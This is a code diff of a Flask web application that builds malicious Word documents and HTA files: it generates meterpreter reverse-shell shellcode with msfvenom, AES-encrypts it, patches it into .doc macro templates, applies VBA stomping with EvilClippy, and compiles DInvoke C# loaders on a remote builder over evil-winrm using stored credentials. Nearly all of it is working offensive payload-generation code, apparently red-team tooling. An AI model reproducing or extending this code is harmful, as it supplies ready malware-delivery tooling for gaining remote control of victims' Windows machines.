@@ -35,12 +35,6 @@ from flask import Flask, render_template, Blueprint, render_template_string, req
 
 from logging.config import dictConfig
 
-from pymetasploit3.msfrpc import MsfRpcClient
-
-# import vba
-# from hta import create_hta
-# from payload import LISTENER_CONFIGS, generate_payload, get_host, PAYLOAD_DIR, setup_listener
-# from powershell import encode_ps, powershell_base64
 
 import binascii
 import itertools
@@ -62,22 +56,32 @@ crypt = Blueprint('crypt', __name__)
 info = Blueprint('info', __name__)
 
 
+
+
+PAYLOAD_DIR = "payloads"
+DOCKER_COMMAND = "sudo podman"
+
+
+# ADAPTERS FOR WEBUI
 SAFE_ADAPTERS = {"tun0", "eth0", "wlan0", "lo"}
 
+
+# EAS
 EGG_START = b"START_AES_HERE_"
 EGG_END = b"_END_AES_HERE"
-
 PWD_START = b"PASSWORD_START_"
 PWD_END = b"_PASSWORD_STOP"
-
 SALT_HEADER = b"Salted__"
-
-
 first_PADDING = b"\x00"
 rest_PADDING = b"\x20"
 
 
-PAYLOAD_DIR = "payloads"
+# EAS generator payload:
+PATH_WINRM_COMMANDS = "/tmp/winrm-commands.txt"
+PATH_TEMPLATE_CS_DINVOKE = "/mnt/exploits/DInvoke/setup/stage-12.cs"
+PAYLOAD_OUTPUT_PATH = f"{PAYLOAD_DIR}/stage-12.cs"
+WINRM_BUILDER_HOST = "10.1.1.51"
+WINRM_CREDENTIALS_FILE = "CREDS_WINRM_BUILDER.txt"
 
 BASIC_LISTENER_CONFIG = {
     "PingbackSleep": 10,
@@ -117,17 +121,18 @@ for cfg in CFGS:
         }
 
         if "https" in full_payload:
-            LISTENER_CONFIGS[key][arch] = LISTENER_CONFIGS[key][arch] | BASIC_LISTENER_CONFIG 
+            LISTENER_CONFIGS[key][arch] = LISTENER_CONFIGS[key][arch] | BASIC_LISTENER_CONFIG
             if 'win' in full_payload:
-                LISTENER_CONFIGS[key][arch] = LISTENER_CONFIGS[key][arch] | {"HttpProxyIE": False}
+                LISTENER_CONFIGS[key][arch] = LISTENER_CONFIGS[key][arch] | {
+                    "HttpProxyIE": False}
 
 # from pprint import pprint
 # pprint(LISTENER_CONFIGS)
 
 msf_client = None
 
-with open('./PASSWORD_MsfRpcClient.txt', 'r') as f:
-    PASSWORD_MsfRpcClient = f.read().strip()
+with open('./PASSWORD_MSF_RPC_CLIENT.txt', 'r') as f:
+    PASSWORD_MSF_RPC_CLIENT = f.read().strip()
 
 with open('templates/WIN_PS_COMMAND.ps1', 'r') as f:
     WIN_PS_COMMAND = f.read().strip()
@@ -383,12 +388,15 @@ def create_hta(encypted_bytes):
     return contents
 
 
-try:
-    msf_client = MsfRpcClient(PASSWORD_MsfRpcClient,
-                              username='python', port=55555)
-except Exception as e:
-    logger.error("COULD NOT CONNECT TO MsfRpcClient")
-    logger.error("WILL CONTINUE WITHOUT LISTENER AUTOMATION!!!!")
+# try:
+msf_client = MsfRpcClient(
+    PASSWORD_MSF_RPC_CLIENT,
+    username='python',
+    port=55555
+)
+# except Exception as e:
+#     logger.error("COULD NOT CONNECT TO MsfRpcClient")
+#     logger.error("WILL CONTINUE WITHOUT LISTENER AUTOMATION!!!!")
 
 
 def generate_payload_hash(payload_props):
@@ -774,7 +782,7 @@ def word_form():
     # template = "reminder:<br>"
     # template += "?ladapter=eth0&lport=443&uid=test"
     template += render_template('1_win_form.html')
-    
+
     ladapter = request.args.get('ladapter', '')
     lport = request.args.get('lport', 443)
     uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
@@ -790,7 +798,7 @@ def word_form():
     return template
 
 
-def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64], extra_args = {"LURI": "","HttpProxyIE": False}):
+def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64], extra_args={"LURI": "", "HttpProxyIE": False}):
     retval = {}
     print(f"{archs=}")
     for arch in archs:
@@ -837,7 +845,8 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     doc_data = doc_path.read_bytes()
     raw_shellcode = shellcode_path.read_bytes()
 
-    print(f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")
+    print(
+        f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")
     print(f"{password=}")
 
     b64_payload = openssl_pbkdf2_encrypt(raw_shellcode, password)
@@ -868,7 +877,7 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     )
 
     b64_pass = base64.b64encode(password.encode())
-    print(f"patch_document{b64_pass =}\n{b64_payload = }")
+    print(f"patch_document{b64_pass=}")
 
     pwd_start_idx = patched.find(PWD_START)
     if pwd_start_idx == -1:
@@ -930,31 +939,49 @@ def generate_encrypted_payloads(id: str, lhost: str, lport: int, password: str, 
             id, lhost, lport, password, arch=int(i), proxy=proxy, payload_type=payload_type)
     return retval
 
+
+def run_winrm_commands(
+    commands: List[str],
+    runtype: str = "os.popen"
+) -> any:
+    if runtype not in ("os.popen", "os.system"):
+        raise ValueError(f"runtype must be 'os.popen' or 'os.system', got {runtype!r}")
+
+    with open(WINRM_CREDENTIALS_FILE, "r") as f:
+        username, password = map(str.strip, f.read().split(":", 1))
+
+    with open(PATH_WINRM_COMMANDS, "w") as f:
+        f.write(commands)
+
+    cmd = (
+        f"cat {PATH_WINRM_COMMANDS} | evil-winrm -i {WINRM_BUILDER_HOST} -u {username} -p {password}"
+    )
+
+    if runtype == "os.system":
+        return os.system(cmd)
+    return os.popen(cmd).read()
+
+
+
+
+
+
 def generate_dinvoke_x64_x86(input_data: Dict) -> Optional[BytesIO]:
     retval = {}
 
-    path_winrm_commands = "/tmp/winrm-commands.txt"
-    path_template_cs_dinvoke = "/mnt/exploits/DInvoke/setup/stage-12.cs"
-    payload_output_path = f"{PAYLOAD_DIR}/stage-12.cs"
-    winrm_builder_host = "10.1.1.51"
-
-    # Read builder credentials
-    with open("CREDS_WINRM_BUILDER.txt", "r") as f:
-        username, password = map(str.strip, f.read().split(":", 1))
 
     # Validate required keys
     required_keys = [32, 64, 'ps', 'password']
     missing_keys = [k for k in required_keys if k not in input_data]
     if missing_keys:
-        raise ValueError(f"input_data is missing required keys: {missing_keys}")
-
-
+        raise ValueError(
+            f"input_data is missing required keys: {missing_keys}")
 
     # with open(f"{PAYLOAD_DIR}/{input_data[32]}", 'rb') as f:
     #     p_32 = f.read()
     # with open(f"{PAYLOAD_DIR}/{input_data[64]}", 'rb') as f:
     #     p_64 = f.read()
-    print(f"{input_data = }")
+    # print(f"{input_data=}")
     # exit()
     replacements = {
         'REPLACE_WITH_MSFVENOM_PASSWORD': input_data['password'],
@@ -964,21 +991,20 @@ def generate_dinvoke_x64_x86(input_data: Dict) -> Optional[BytesIO]:
     }
 
     # Load and patch payload
-    with open(path_template_cs_dinvoke, "r") as f:
+    with open(PATH_TEMPLATE_CS_DINVOKE, "r") as f:
         payload = f.read()
-
 
     for placeholder, replacement in replacements.items():
         payload = payload.replace(placeholder, replacement)
 
     # Write patched payload
-    with open(payload_output_path, "w") as f:
+    with open(PAYLOAD_OUTPUT_PATH, "w") as f:
         f.write(payload)
 
     # Prepare WinRM commands
     winrm_command = rf"""del .\stage-12.cs
 del .\exploit-program.exe
-upload {payload_output_path}
+upload {PAYLOAD_OUTPUT_PATH}
 $dinvokePath = "C:\Tools\NuGetPkgs\DInvoke.1.0.4\lib\net35\DInvoke.dll"
 $sma = [System.Management.Automation.PowerShell].Assembly.Location
 & C:\Windows\Microsoft.NET\Framework\v4.0.*\csc.exe /resource:"$dinvokePath",DInvoke.dll /reference:"$sma" /target:exe /platform:anycpu /out:exploit-program.exe .\stage-12.cs /optimize+ /d:TRACE /filealign:512
@@ -988,99 +1014,69 @@ cd ..
 download ./exploit-program.exe /tmp/loader.exe
 download ./exploit-program.bin /tmp/loader.bin
 exit"""
-
-    print(winrm_command)
-
-    # Write command file
-    with open(path_winrm_commands, "w") as f:
-        f.write(winrm_command)
-
-    # Run evil-winrm session
-    os.system(f'cat {path_winrm_commands} | evil-winrm -i {winrm_builder_host} -u {username} -p {password}')
-
-    # Optional: check output binary type
-    with os.popen('file /tmp/loader.exe') as f:
-        print(f.read())
+    
+    # print(winrm_command)
+    run_winrm_commands(winrm_command)
 
     with open('/tmp/loader.bin', 'rb') as f:
         return f.read()
 
 
-def generate_word_pingback_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
+
+
+def stomp_doc(path_original, stomp_version):
+    path_original = Path(path_original).resolve()
+    doc_name = path_original.name
+    no_trailing = str(path_original.parent).rstrip("/")
+    stomped_path = str(path_original).replace(".doc", "_EvilClippy.doc")
+    fake_vba = " "
+    # Create the macro manually into the same dir
+#     fake_vba_path = os.path.join(no_trailing, "fakecode.vba")
+#     with open(fake_vba_path, "w") as f:
+#         f.write("""Sub HelloWorld()
+# msgbox "Hello World"
+# End Sub
+# """)
+    # fake_vba = "-s fakecode.vba"
+
+
+    if not Path("/opt/EvilClippy").exists():
+        print("[*] Cloning EvilClippy...")
+        os.system("git clone https://github.com/esp0xdeadbeef/EvilClippy /opt/EvilClippy")
+
+
+    print("[*] Building EvilClippy Docker image (if not already built)...")
+    cmd = f"cd /opt/EvilClippy && {DOCKER_COMMAND} build -t evilclippy ."
+    os.system(cmd)
+
+    set_rights_to_current_user = ""
+    
+    print("[*] Running EvilClippy...")
+    cmd = f"""{DOCKER_COMMAND} run -v {no_trailing}:/tmp/outfiles/ --rm evilclippy -t {stomp_version} -u {fake_vba} {doc_name}"""
+    os.system(cmd)
+    if 'sudo' in DOCKER_COMMAND:
+        cmd = f"sudo chown $(id -u):$(id -g) {str(path_original).replace(".doc", "*")}"
+        os.system(cmd)
+    
+    print(f"[+] Macro stomped into {stomped_path}")
+    return stomped_path
+
+def generate_word_revshell_aes(lhost, lport, proxy, id, stomp_version, template_path: str) -> Optional[BytesIO]:
     from tempfile import NamedTemporaryFile
-    import uuid
+
+    ps_type = "ps_proxy" if proxy else "ps"
+
+    output_file_path = f"/tmp/{pathlib.Path(template_path).stem}_{lhost}_{lport}_{proxy}_{id}_{stomp_version}.doc".replace(' ', '_').strip()
+
+    output_file_path_cache = output_file_path
+    if stomp_version:
+        output_file_path_cache = output_file_path.replace(".doc", "_EvilClippy.doc")
     
-    if proxy:
-        ps_type = "ps_proxy"
-    else:
-        ps_type = "ps"
-    command_text = f"ping -n 1 {lhost}"
-    password = str(uuid.uuid4()).replace('-', '')
-    encoded_powershell_command = encode_ps(command_text)
+    if os.path.exists(output_file_path_cache):
+        # cached
+        with open(output_file_path_cache, 'rb') as f:
+            return BytesIO(f.read())
 
-
-    payloads = {}
-    with NamedTemporaryFile(mode='rb', delete=True) as shellcode_file:
-        shellcode_path = pathlib.Path(shellcode_file.name)
-        os.system(f'''msfvenom -a x86 -p windows/exec CMD="{command_text}" -f raw -o {shellcode_path}''')
-        shellcode_file.seek(0)
-        raw_bytes_x32 = shellcode_file.read()
-        # payloads[32] = raw_bytes_x32
-        payloads[32] = openssl_pbkdf2_encrypt(raw_bytes_x32, password)
-
-    # 64-bit payload
-    with NamedTemporaryFile(mode='rb', delete=True) as shellcode_file:
-        shellcode_path = pathlib.Path(shellcode_file.name)
-        os.system(f'''msfvenom -p windows/x64/exec CMD="{command_text}" -f raw -o {shellcode_path}''')
-        shellcode_file.seek(0)
-        raw_bytes_x64 = shellcode_file.read()
-        # payloads[64] = raw_bytes_x64
-        payloads[64] = openssl_pbkdf2_encrypt(raw_bytes_x64, password)
-
-
-    
-    print(f"{payloads =}")
-    payloads['ps'] = encoded_powershell_command
-    payloads['password'] = password
-    
-    payload_entry = generate_dinvoke_x64_x86(payloads)
-
-    if isinstance(payload_entry, str):
-        with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
-            shellcode = f.read()
-    elif isinstance(payload_entry, bytes):
-        shellcode = payload_entry
-    else:
-        raise ValueError("Unsupported shellcode payload type")
-
-    # password = str(uuid.uuid4()).replace('-', '')
-
-    with NamedTemporaryFile(delete=False) as shellcode_file:
-        shellcode_path = pathlib.Path(shellcode_file.name)
-        shellcode_file.write(shellcode)
-
-    doc_path = pathlib.Path(template_path)
-    with NamedTemporaryFile(delete=False) as output_file:
-        output_path = pathlib.Path(output_file.name)
-    
-
-    # shellcode_path = pathlib.Path("/tmp/loader.bin")
-
-    patch_document(doc_path, shellcode_path, output_path, password)
-
-    with open(output_path, 'rb') as f:
-        patched_data = f.read()
-
-    return BytesIO(patched_data)
-
-def generate_word_revshell_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
-    from tempfile import NamedTemporaryFile
-    import uuid
-    
-    if proxy:
-        ps_type = "ps_proxy"
-    else:
-        ps_type = "ps"
     command_text = render_template_string(
         WIN_PS_COMMAND,
         lhost=lhost,
@@ -1089,20 +1085,85 @@ def generate_word_revshell_aes(lhost, lport, proxy, id, template_path: str, stom
         type=ps_type,
         proxy=proxy
     ).strip()
+
     password = str(uuid.uuid4()).replace('-', '')
     encoded_powershell_command = encode_ps(command_text)
+
     payloads = generate_encrypted_payloads(
-                id=id,
-                lhost=lhost,
-                lport=int(lport),
-                password=password,
-                archs=[32, 64],
-                proxy=proxy
-            )
-    print(f"{payloads =}")
+        id=id,
+        lhost=lhost,
+        lport=int(lport),
+        password=password,
+        archs=[32, 64],
+        proxy=proxy
+    )
     payloads['ps'] = encoded_powershell_command
     payloads['password'] = password
-    
+
+    payload_entry = generate_dinvoke_x64_x86(payloads)
+
+    if isinstance(payload_entry, str):
+        with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
+            shellcode = f.read()
+    elif isinstance(payload_entry, bytes):
+        shellcode = payload_entry
+    else:
+        raise ValueError("Unsupported shellcode payload type")
+
+    with NamedTemporaryFile(delete=False) as shellcode_file:
+        shellcode_path = pathlib.Path(shellcode_file.name)
+        shellcode_file.write(shellcode)
+
+    doc_path = pathlib.Path(template_path)
+    output_path = pathlib.Path(output_file_path)
+
+    print(f"patching document: {template_path = } {output_path = }")
+    patch_document(doc_path, shellcode_path, output_path, password)
+
+    if not stomp_version:
+        with open(output_path, 'rb') as f:
+            return BytesIO(f.read())
+    else:
+        with open(stomp_doc(output_path, stomp_version), 'rb') as f:
+            return BytesIO(f.read())
+
+
+def generate_word_pingback_aes(lhost, lport, proxy, id, stomp_version, template_path: str) -> Optional[BytesIO]:
+    from tempfile import NamedTemporaryFile
+    import uuid
+
+    if proxy:
+        ps_type = "ps_proxy"
+    else:
+        ps_type = "ps"
+    command_text = f"ping -n 1 {lhost}"
+    password = str(uuid.uuid4()).replace('-', '')
+    encoded_powershell_command = encode_ps(command_text)
+
+    payloads = {}
+    with NamedTemporaryFile(mode='rb', delete=True) as shellcode_file:
+        shellcode_path = pathlib.Path(shellcode_file.name)
+        os.system(
+            f'''msfvenom -a x86 -p windows/exec CMD="{command_text}" -f raw -o {shellcode_path}''')
+        shellcode_file.seek(0)
+        raw_bytes_x32 = shellcode_file.read()
+        # payloads[32] = raw_bytes_x32
+        payloads[32] = openssl_pbkdf2_encrypt(raw_bytes_x32, password)
+
+    # 64-bit payload
+    with NamedTemporaryFile(mode='rb', delete=True) as shellcode_file:
+        shellcode_path = pathlib.Path(shellcode_file.name)
+        os.system(
+            f'''msfvenom -p windows/x64/exec CMD="{command_text}" -f raw -o {shellcode_path}''')
+        shellcode_file.seek(0)
+        raw_bytes_x64 = shellcode_file.read()
+        # payloads[64] = raw_bytes_x64
+        payloads[64] = openssl_pbkdf2_encrypt(raw_bytes_x64, password)
+
+    print(f"{payloads=}")
+    payloads['ps'] = encoded_powershell_command
+    payloads['password'] = password
+
     payload_entry = generate_dinvoke_x64_x86(payloads)
 
     if isinstance(payload_entry, str):
@@ -1122,50 +1183,80 @@ def generate_word_revshell_aes(lhost, lport, proxy, id, template_path: str, stom
     doc_path = pathlib.Path(template_path)
     with NamedTemporaryFile(delete=False) as output_file:
         output_path = pathlib.Path(output_file.name)
-    
-    # shellcode_path = pathlib.Path("/mnt/exploits/DInvoke/bin/loader-eth0-80-stager-vba-eth0-4f02037210b546e096513f690b24974f.bin")
 
-    shellcode_path = pathlib.Path("/tmp/loader.bin")
+    # shellcode_path = pathlib.Path("/tmp/loader.bin")
 
     patch_document(doc_path, shellcode_path, output_path, password)
 
-    with open(output_path, 'rb') as f:
-        patched_data = f.read()
+    if not stomp_version:
+        with open(output_path, 'rb') as f:
+            retval = f.read()
+    else:
+        with open(stomp_doc(output_path, stomp_version), 'rb') as f:
+            retval = f.read()
+    return BytesIO()
 
-    return BytesIO(patched_data)
+
 
 
 @win.route('/word_form/get', methods=['POST'])
 def word_get():
     payload_type = request.form['type']
-    stomp_vba = ('stomp_vba' in request.form.keys())
+    stomp_version = request.form.get('stomp_version', '')
+
+    valid_versions = [
+        "2010x86", "2010x64",
+        "2013x86", "2013x64",
+        "2016x86", "2016x64",
+        "2019x86", "2019x64"
+    ]
+
+    if stomp_version == "":
+        stomp_version = None  # No stomping
+    elif stomp_version not in valid_versions:
+        raise Exception(f"Invalid version: {stomp_version}")
+
     proxy = ('system_proxy' in request.form.keys())
     lhost = request.form['lhost']
     lport = int(request.form['lport'])
     id = filter_string(request.form['id'])
 
-
     if id == "":
         return "Invalid id", 400
 
     if payload_type == "vba_shellcode":
+        
+        if stomp_version and stomp_version != "2016x86":
+            stomp_version = "2016x86"
+            print(f"!!!! ONLY SUPPORTS x86 with VBA shellcode. Forcing stomp version {stomp_version}.")
+            
+
+
         payloads = gen_multiple_payloads(
-            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
+            lhost, lport, proxy, id,
+            config="windows_meterpreter_reverse_winhttps",
+            endpoint="ms",
+            archs=[32, 64]
         )
         template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
         word_file_stream = generate_word_file(
-            template_path, [encrypt_raw_payload(payloads[32]), encrypt_raw_payload(payloads[64])], stomp_vba)
+            template_path,
+            [encrypt_raw_payload(payloads[32]), encrypt_raw_payload(payloads[64])],
+            stomp_version  # Pass as version
+        )
+
     elif payload_type == "aes_shellcode_revshell":
         template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
         word_file_stream = generate_word_revshell_aes(
-            lhost, lport, proxy, id, template_path, stomp_vba
+            lhost, lport, proxy, id, stomp_version, template_path
         )
 
     elif payload_type == "aes_shellcode_pingback":
         template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
         word_file_stream = generate_word_pingback_aes(
-            lhost, lport, proxy, id, template_path, stomp_vba
+            lhost, lport, proxy, id, stomp_version, template_path
         )
+
     else:
         return "Invalid type", 400
 
@@ -1177,13 +1268,14 @@ def word_get():
     )
 
 
+
 @win.route('/hta/get', methods=['POST'])
 def hta_get():
     lhost = request.form['lhost']
     lport = int(request.form['lport'])
     proxy = ('system_proxy' in request.form.keys())
     id = filter_string(request.form['id'])
-    
+
     if id == "":
         return "Invalid id", 400
 
@@ -1357,7 +1449,6 @@ def aes_payload():
             proxy=proxy
         )
         return encrypted_blob
-
 
 
 app = Flask(__name__)
